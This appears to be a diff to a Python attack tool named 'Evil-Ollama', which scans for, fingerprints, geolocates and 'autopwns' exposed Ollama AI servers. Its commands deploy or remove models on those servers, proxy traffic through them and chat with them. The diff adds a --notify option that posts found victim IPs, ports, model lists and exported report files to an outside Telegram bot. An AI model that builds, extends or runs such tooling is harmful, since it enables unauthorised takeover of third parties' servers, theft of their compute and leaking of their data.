@@ -2636,18 +3139,25 @@ Examples:
             log("Specify --target, --pull, or --analyze", "ERROR")
     
     elif args.command == "deploy":
-        import requests
+        import requests as _req
         model = args.model
         log(f"📦 DEPLOY MODE: Pushing model '{model}' to Ollama instances...", "STEP")
         
         if args.all:
             log(f"📦 Deploying to ALL saved instances...", "INFO")
-            deploy_model_to_all(model)
+            results = deploy_model_to_all(model)
+            if args.notify:
+                for inst in load_found():
+                    notify_found(inst)
         elif args.target:
             log(f"📦 Deploying to {args.target}...", "INFO")
             result = deploy_model_to_instance(args.target, model)
             if result.get("success"):
                 log(f"✅ Model '{model}' deployed to {args.target}", "OK")
+                if args.notify:
+                    host_parts = args.target.split(":")
+                    notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                                 "deployed": model, "success": True})
             else:
                 log(f"❌ Failed to deploy to {args.target}: {result.get('status')}", "ERROR")
         else:
@@ -2655,36 +3165,72 @@ Examples:
     
     elif args.command == "push":
         cmd_push(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "push", "model": args.model})
     
     elif args.command == "create":
         cmd_create(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "create", "model": args.model})
     
     elif args.command == "copy":
         cmd_copy(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "copy", "source": args.source, "dest": args.dest})
     
     elif args.command == "remove":
         cmd_remove(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "remove", "model": args.model})
     
     elif args.command == "ps":
         cmd_ps(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "ps"})
     
     elif args.command == "embed":
         cmd_embed(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "embed", "model": args.model})
     
     elif args.command == "generate":
         cmd_generate(args)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "generate", "model": args.model})
     
     elif args.command == "proxy":
         if args.socks:
             start_socks_proxy(args.target, args.port, args.host)
         else:
             start_proxy(args.target, args.port, args.host)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "proxy", "port": args.port})
     
     elif args.command == "chat":
         if args.batch:
             batch_chat(args.target, args.batch)
         else:
             interactive_chat(args.target)
+        if args.notify:
+            host_parts = args.target.split(":")
+            notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                         "action": "chat"})
     
     elif args.command == "fingerprint":
         if args.target:
@@ -2720,7 +3266,20 @@ Examples:
                 for ep in fp['accessible_endpoints'][:15]:
                     print(f"    ✓ {ep}")
             
+            # Geo
+            if args.geo:
+                host = args.target.split(":")[0]
+                geo = geolocate_ip(host)
+                if geo:
+                    print(f"\n  {C.CYAN}Location:{C.END}    {geo.get('city','?')}, {geo.get('country','?')} ({geo.get('org','?')})")
+            
             print(f"{C.MAGENTA}{'='*70}{C.END}\n")
+            
+            # Notify
+            if args.notify:
+                host_parts = args.target.split(":")
+                notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                             "models": fp.get("models", []), "model_count": fp.get("model_count", 0)})
             
         elif args.all:
             instances = load_found()
@@ -2739,13 +3298,41 @@ Examples:
         if not instances:
             log("No instances to export. Run scan first.", "WARN")
             return
-        do_export(instances, args.format)
+        out_file = do_export(instances, args.format)
+        if args.notify:
+            # Send report via Telegram
+            cfg = get_config()
+            token = cfg.get("telegram_token") or os.environ.get("TELEGRAM_BOT_TOKEN")
+            chat_id = cfg.get("telegram_chat_id") or os.environ.get("TELEGRAM_CHAT_ID")
+            if token and chat_id and out_file and os.path.exists(out_file):
+                import requests as req
+                url = f"https://api.telegram.org/bot{token}/sendDocument"
+                with open(out_file, 'rb') as f:
+                    resp = req.post(url, data={"chat_id": chat_id, "caption": f"🦙 Evil-Ollama Report — {len(instances)} instances"}, files={"document": f})
+                    if resp.status_code == 200:
+                        log("📄 Report sent to Telegram", "OK")
+                    else:
+                        log(f"Telegram send failed: {resp.status_code}", "WARN")
     
     elif args.command == "show":
         instances = load_found()
         show_instances(instances, args.geo)
         if args.export:
-            do_export(instances, args.export)
+            out_file = do_export(instances, args.export)
+        if args.notify:
+            cfg = get_config()
+            token = cfg.get("telegram_token") or os.environ.get("TELEGRAM_BOT_TOKEN")
+            chat_id = cfg.get("telegram_chat_id") or os.environ.get("TELEGRAM_CHAT_ID")
+            if token and chat_id and instances:
+                summary = f"🦙 Evil-Ollama Report\n{len(instances)} instances found\n"
+                for inst in instances[:5]:
+                    summary += f"• {inst['ip']}:{inst.get('port',11434)}"
+                    if inst.get('model_count'):
+                        summary += f" ({inst['model_count']} models)"
+                    summary += "\n"
+                if len(instances) > 5:
+                    summary += f"... and {len(instances)-5} more"
+                send_telegram(summary, token, chat_id)
     
     elif args.command == "monitor":
         cfg = get_config()
@@ -2785,7 +3372,13 @@ Examples:
                 log("✅ Shodan key set", "OK")
     
     elif args.command == "autopwn":
-        autopwn(args.random, not args.no_vuln, args.port)
+        autopwn(args.random, not args.no_vuln, args.port, args.geo)
+        if args.notify:
+            for inst in load_found():
+                notify_found(inst)
+    
+    elif args.command in ("docs", "documentation"):
+        run_docs_server()
 
 
 if __name__ == "__main__":
